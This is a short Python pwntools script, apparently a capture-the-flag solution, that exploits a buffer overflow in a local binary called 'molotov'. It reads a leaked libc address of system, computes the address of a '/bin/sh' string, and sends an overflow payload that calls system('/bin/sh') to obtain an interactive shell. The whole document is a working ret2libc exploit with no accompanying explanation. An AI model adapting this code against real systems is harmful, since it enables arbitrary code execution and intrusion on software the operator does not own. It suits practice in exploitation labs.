#!/bin/python

from pwn import *

# debug with files
f = open("out", 'w')

payload = "A"*32

libc = ELF('/lib/i386-linux-gnu/libc.so.6')
p = process("./molotov")
address = p.recvuntil("\n")
address = address[:-1]
address = int(address, 16)
base = address - libc.symbols['system']
binsh = p32(base + 0x0018c32b)
address = p32(address)
payload += address
payload += "BBBB"
payload += binsh
p.sendline(payload)
p.interactive()




f.close()
